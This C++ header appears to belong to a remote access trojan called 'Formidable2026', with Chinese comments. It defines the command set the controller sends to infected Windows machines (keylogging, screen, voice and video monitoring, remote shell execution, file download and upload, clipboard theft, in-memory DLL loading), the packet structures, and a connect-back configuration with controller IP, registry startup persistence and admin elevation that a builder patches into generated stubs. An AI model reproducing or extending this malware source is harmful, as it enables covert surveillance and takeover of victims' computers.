/**
 * Formidable2026 - Common Configuration
 * Encoding: UTF-8 BOM
 */
#ifndef FORMIDABLE_CONFIG_H
#define FORMIDABLE_CONFIG_H
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <cstdint>
#pragma comment(lib, "ws2_32.lib")
namespace Formidable {
    const std::string VERSION = "2026.1.0";
    const int DEFAULT_PORT = 6543;
    const char MASTER_HASH[] = "Formidable2026_Auth_Key";
    // 命令定义
    enum CommandType : uint32_t {
        CMD_UNKNOWN = 0,
        CMD_HEARTBEAT = 1,      // 心跳
        CMD_GET_SYSINFO = 10,   // 获取系统信息
        
        // 文件管理 (20-39)
        CMD_FILE_LIST = 20,     // 获取文件列表
        CMD_FILE_DOWNLOAD = 21, // 下载文件
        CMD_FILE_UPLOAD = 22,   // 上传文件
        CMD_FILE_DELETE = 23,   // 删除文件
        CMD_FILE_RENAME = 24,   // 重命名文件
        CMD_FILE_RUN = 25,      // 运行文件
        CMD_FILE_DATA = 26,     // 文件数据块传输
        CMD_DRIVE_LIST = 27,    // 获取磁盘驱动器列表
        CMD_FILE_MKDIR = 28,    // 创建文件夹
        CMD_FILE_DOWNLOAD_DIR = 29, // 递归下载文件夹
        
        // 进程管理 (40-49)
        CMD_PROCESS_LIST = 40,  // 获取进程列表
        CMD_PROCESS_KILL = 41,  // 结束进程
        CMD_PROCESS_MODULES = 42, // 获取进程模块列表
        
        // 窗口/桌面管理 (50-59)
        CMD_WINDOW_LIST = 50,   // 获取窗口列表
        CMD_SCREEN_CAPTURE = 51, // 屏幕截图/监控
        CMD_WINDOW_CTRL = 52,   // 窗口控制 (最大化/最小化/关闭等)
        CMD_MOUSE_EVENT = 53,   // 鼠标事件
        CMD_KEY_EVENT = 54,     // 键盘事件
        
        // 终端管理 (60-69)
        CMD_TERMINAL_OPEN = 60, // 打开终端
        CMD_TERMINAL_DATA = 61, // 终端数据
        CMD_SHELL_EXEC = 62,    // 远程执行命令 (WinExec)
        CMD_TERMINAL_CLOSE = 63,// 关闭终端
        
        // 语音/视频 (70-79)
        CMD_VOICE_STREAM = 70,  // 语音监听
        CMD_VIDEO_STREAM = 71,  // 视频监控
        
        // 系统管理 (80-89)
        CMD_SERVICE_LIST = 80,  // 服务管理
        CMD_REGISTRY_CTRL = 81, // 注册表管理
        
        // 辅助功能 (90-99)
        CMD_KEYLOG = 90,        // 键盘记录
        CMD_CLIPBOARD_GET = 91, // 获取剪贴板
        CMD_CLIPBOARD_SET = 92, // 设置剪贴板
        CMD_SETTINGS = 93,      // 参数设置
        CMD_GEN_SERVICE = 94,   // 生成服务
        
        CMD_LOAD_MODULE = 100,  // 内存加载模块 (DLL)
        CMD_EXIT = 999          // 退出
    };
#pragma pack(push, 1)
    struct ProcessInfo {
        uint32_t pid;
        uint32_t threads;
        uint32_t priority;
        char name[256];
        char path[MAX_PATH];
        char arch[8]; // x86 or x64
        char owner[64]; // Process owner (User)
    };
    struct ModuleInfo {
        uint64_t baseAddr;
        uint32_t size;
        char name[256];
        char path[MAX_PATH];
    };
    struct RemoteMouseEvent {
        uint32_t msg;   // WM_LBUTTONDOWN, etc.
        int32_t x;
        int32_t y;
        uint32_t data;
    };
    struct RemoteKeyEvent {
        uint32_t msg;
        uint32_t vk;
    };
    struct CONNECT_ADDRESS {
        char        szFlag[32];      // 标识
        char        szServerIP[100]; // 主控IP
        char        szPort[8];       // 主控端口
        int32_t     iType;           // 客户端类型
        int32_t     bEncrypt;        // 上线信息是否加密
        char        szBuildDate[12]; // 构建日期(版本)
        int32_t     iMultiOpen;      // 支持打开多个
        int32_t     iStartup;        // 启动方式
        int32_t     iHeaderEnc;      // 数据加密类型
        char        protoType;       // 协议类型
        char        runningType;     // 运行方式
        char        szGroupName[24]; // 分组名称
        char        runasAdmin;      // 是否提升权限运行
        char        szReserved[11];  // 占位
        uint64_t    clientID;        // 客户端唯一标识
        uint64_t    parentHwnd;      // 父进程窗口句柄
        uint64_t    superAdmin;      // 管理员主控ID
        char        pwdHash[64];     // 密码哈希
    };
    struct PkgHeader {
        char flag[8];       // "FRMD26?"
        int32_t totalLen;   // 整个包长度 (Header + Body)
        int32_t originLen;  // Body 长度
    };
    struct CommandPkg {
        uint32_t cmd;       // CommandType
        uint32_t arg1;
        uint32_t arg2;
        char data[1];       // 变长数据
    };
    struct ClientInfo {
        char osVersion[64];
        char computerName[64];
        char userName[64];
        char cpuInfo[128];       // CPU型号
        char lanAddr[64];       // LAN 地址
        char activeWindow[256]; // 当前活动窗口
        char installTime[64];   // 安装/上线时间
        char uptime[64];        // 系统运行时间
        char version[32];       // 客户端版本
        uint32_t processID;
        int32_t rtt;            // 延迟
        int32_t is64Bit;        // 使用int32代替bool
        int32_t isAdmin;
        int32_t hasCamera;
        int32_t clientType;     // 客户端类型
    };
#pragma pack(pop)
    // 默认上线配置（用于特征匹配和生成服务端替换）
    const CONNECT_ADDRESS DEFAULT_CONFIG = {
        "FRMD26_CONFIG",        // szFlag
        "127.0.0.1",            // szServerIP
        "6543",                 // szPort
        0,                      // iType
        0,                      // bEncrypt
        "2026-02-03",           // szBuildDate
        1,                      // iMultiOpen
        1,                      // iStartup (1: Registry)
        0,                      // iHeaderEnc
        0,                      // protoType
        0,                      // runningType
        "Default",              // szGroupName
        1,                      // runasAdmin
        "",                     // szReserved
        0,                      // clientID
        0,                      // parentHwnd
        0,                      // superAdmin
        ""                      // pwdHash
    };
}
#endif // FORMIDABLE_CONFIG_H
